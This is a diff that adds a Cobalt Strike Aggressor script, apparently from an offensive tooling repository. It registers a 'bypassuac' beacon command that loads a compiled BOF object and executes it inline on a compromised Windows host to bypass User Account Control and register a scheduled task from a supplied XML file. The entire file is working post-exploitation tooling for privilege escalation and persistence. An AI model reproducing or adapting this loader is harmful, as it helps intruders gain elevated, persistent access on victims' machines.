@@ -1,0 +1,42 @@
+#bypassuac Bof
+#author @BambiZombie
+
+#register help
+beacon_command_register("bypassuac", "Bypass UAC to Add a Task.",
+	"Synopsis: bypassuac <Task name> <XML>\n" .
+	"Bof implementation of the bypassuac.\n");
+
+alias bypassuac {
+    $bid = $1;
+
+    $input = substr($0, 11);
+    @args = split(' ', $input);
+
+    $taskname = @args[0];
+    $xmlfile = @args[1];
+
+    if ($taskname eq " ") {
+      berror($bid, "Please specify a task name.");
+		  return;
+    }
+
+    if ($xmlfile eq "") {
+		  berror($bid, "Please specify a task xml.");
+		  return;
+    }
+    
+    # Read in the right BOF file
+    $handle1 = openf(script_resource("bypassuac." . barch($bid) . ".o"));
+    $data1   = readb($handle1, -1);
+    closef($handle1);
+	
+	# Read from the XML file
+    $handle2 = openf(script_resource($xmlfile));
+    $data2   = readb($handle2, -1);
+    closef($handle2);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "ZZ", $taskname, $data2);
+    
+    beacon_inline_execute($bid, $data1, "go", $arg_data);
+}
